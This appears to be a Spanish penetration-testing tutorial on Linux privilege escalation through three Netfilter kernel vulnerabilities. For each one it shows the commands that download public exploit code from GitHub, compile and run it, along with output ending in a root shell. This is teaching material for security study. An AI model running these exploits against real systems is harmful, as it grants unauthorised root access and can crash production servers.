
# Netfilter

`Netfilter` es un módulo del kernel de Linux que proporciona, entre otras cosas, filtrado de paquetes, traducción de direcciones de red y otras herramientas relevantes para los cortafuegos. Controla y regula el tráfico de red manipulando paquetes individuales en función de sus características y reglas. `Netfilter` también se denomina capa de software en el kernel de Linux. Cuando se reciben y envían paquetes de red, inicia la ejecución de otros módulos, como filtros de paquetes. Estos módulos pueden interceptar y manipular paquetes. Esto incluye programas como `iptables` y `arptables`, que sirven como mecanismos de acción del sistema de hook `Netfilter` del stack de protocolos IPv4 e IPv6.

Este módulo del kernel tiene tres funciones principales:

1. `Desfragmentación de paquetes`
2. `Seguimiento de conexión`
3. `Traducción de direcciones de red (NAT)`

Cuando se activa el módulo, todos los paquetes IP son comprobados por el `Netfilter` antes de ser reenviados a la aplicación de destino del sistema propio o remoto. En 2021 ( [CVE-2021-22555](https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555) ), 2022 ( [CVE-2022-1015](https://github.com/pqlx/CVE-2022-1015) ) y también en 2023 ( [CVE-2023-32233](https://github.com/Liuk3r/CVE-2023-32233) ), se encontraron varias vulnerabilidades que podrían provocar una escalada de privilegios.

Muchas empresas han preconfigurado distribuciones de Linux adaptadas a sus aplicaciones de software o viceversa. Esto proporciona a los desarrolladores y administradores, metafóricamente hablando, una "base dinámica" que es difícil de reemplazar. Esto requeriría adaptar el sistema a la aplicación de software o adaptar la aplicación al sistema más nuevo. Dependiendo del tamaño y la complejidad de la aplicación, esto puede requerir una gran cantidad de tiempo y esfuerzo. A menudo, este es el motivo por el que muchas empresas utilizan distribuciones de Linux antiguas y no actualizadas en producción.

Incluso si la empresa utiliza máquinas virtuales o contenedores como Docker, estos se construyen sobre un núcleo específico. La idea de aislar la aplicación de software del sistema host existente es un buen paso, pero hay muchas formas de salir de ese contenedor.

## <mark style="color:purple;">**CVE-2021-22555**</mark>

Versiones de kernel vulnerables: 2.6 - 5.11

```shell-session
cry0l1t3@ubuntu:~$ uname -r

5.10.5-051005-generic
```

```shell-session
cry0l1t3@ubuntu:~$ wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
cry0l1t3@ubuntu:~$ gcc -m32 -static exploit.c -o exploit
cry0l1t3@ubuntu:~$ ./exploit

[+] Linux Privilege Escalation by theflow@ - 2021

[+] STAGE 0: Initialization
[*] Setting up namespace sandbox...
[*] Initializing sockets and message queues...

[+] STAGE 1: Memory corruption
[*] Spraying primary messages...
[*] Spraying secondary messages...
[*] Creating holes in primary messages...
[*] Triggering out-of-bounds write...
[*] Searching for corrupted primary message...
[+] fake_idx: fff
[+] real_idx: fdf

...SNIP...

root@ubuntu:/home/cry0l1t3# id

uid=0(root) gid=0(root) groups=0(root)
```

## <mark style="color:purple;">**CVE-2022-25636**</mark>

Una vulnerabilidad reciente es [CVE-2022-25636](https://www.cvedetails.com/cve/CVE-2022-25636/) y afecta a los kernels de Linux 5.4 a 5.6.10. Se trata de `net/netfilter/nf_dup_netdev.c`, que puede otorgar privilegios de root a usuarios locales debido a escrituras fuera de límites en el montón. escribió un [artículo](https://nickgregory.me/post/2022/03/12/cve-2022-25636/)`Nick Gregory` muy detallado sobre cómo descubrió esta vulnerabilidad.

```shell-session
cry0l1t3@ubuntu:~$ uname -r

5.13.0-051300-generic
```

Sin embargo, debemos tener cuidado con este exploit ya que puede dañar el kernel y será necesario reiniciar para volver a acceder al servidor.

```shell-session
cry0l1t3@ubuntu:~$ git clone https://github.com/Bonfee/CVE-2022-25636.git
cry0l1t3@ubuntu:~$ cd CVE-2022-25636
cry0l1t3@ubuntu:~$ make
cry0l1t3@ubuntu:~$ ./exploit

[*] STEP 1: Leak child and parent net_device
[+] parent net_device ptr: 0xffff991285dc0000
[+] child  net_device ptr: 0xffff99128e5a9000

[*] STEP 2: Spray kmalloc-192, overwrite msg_msg.security ptr and free net_device
[+] net_device struct freed

[*] STEP 3: Spray kmalloc-4k using setxattr + FUSE to realloc net_device
[+] obtained net_device struct

[*] STEP 4: Leak kaslr
[*] kaslr leak: 0xffffffff823093c0
[*] kaslr base: 0xffffffff80ffefa0

[*] STEP 5: Release setxattrs, free net_device, and realloc it again
[+] obtained net_device struct

[*] STEP 6: rop :)

# id

uid=0(root) gid=0(root) groups=0(root)
```

## <mark style="color:purple;">**CVE-2023-32233**</mark>

Esta vulnerabilidad explota la denominada " `anonymous sets` in `nf_tables`" mediante el uso de la vulnerabilidad `Use-After-Free` en el kernel de Linux hasta la versión `6.3.1`. Estos `nf_tables` son espacios de trabajo temporales para procesar solicitudes por lotes y, una vez que se realiza el procesamiento, se supone que estos conjuntos anónimos se borran (`Use-After-Free`) para que ya no se puedan usar. Debido a un error en el código, estos conjuntos anónimos no se manejan correctamente y el programa aún puede acceder a ellos y modificarlos.

La explotación se realiza manipulando el sistema para que use los `cleared out`conjuntos anónimos para interactuar con la memoria del núcleo. Al hacerlo, podemos obtener `root`privilegios.

### **Prueba de concepto**

```shell-session
cry0l1t3@ubuntu:~$ git clone https://github.com/Liuk3r/CVE-2023-32233
cry0l1t3@ubuntu:~$ cd CVE-2023-32233
cry0l1t3@ubuntu:~/CVE-2023-32233$ gcc -Wall -o exploit exploit.c -lmnl -lnftnl
```

### **Explotación**

```shell-session
cry0l1t3@ubuntu:~/CVE-2023-32233$ ./exploit

[*] Netfilter UAF exploit

Using profile:
========
1                   race_set_slab                   # {0,1}
1572                race_set_elem_count             # k
4000                initial_sleep                   # ms
100                 race_lead_sleep                 # ms
600                 race_lag_sleep                  # ms
100                 reuse_sleep                     # ms
39d240              free_percpu                     # hex
2a8b900             modprobe_path                   # hex
23700               nft_counter_destroy             # hex
347a0               nft_counter_ops                 # hex
a                   nft_counter_destroy_call_offset # hex
ffffffff            nft_counter_destroy_call_mask   # hex
e8e58948            nft_counter_destroy_call_check  # hex
========

[*] Checking for available CPUs...
[*] sched_getaffinity() => 0 2
[*] Reserved CPU 0 for PWN Worker
[*] Started cpu_spinning_loop() on CPU 1
[*] Started cpu_spinning_loop() on CPU 2
[*] Started cpu_spinning_loop() on CPU 3
[*] Creating "/tmp/modprobe"...
[*] Creating "/tmp/trigger"...
[*] Updating setgroups...
[*] Updating uid_map...
[*] Updating gid_map...
[*] Signaling PWN Worker...
[*] Waiting for PWN Worker...

...SNIP...

[*] You've Got ROOT:-)

# id

uid=0(root) gid=0(root) groups=0(root)
```

{% hint style="warning" %}
Tenga en cuenta que estos exploits pueden ser muy inestables y pueden dañar el sistema.
{% endhint %}
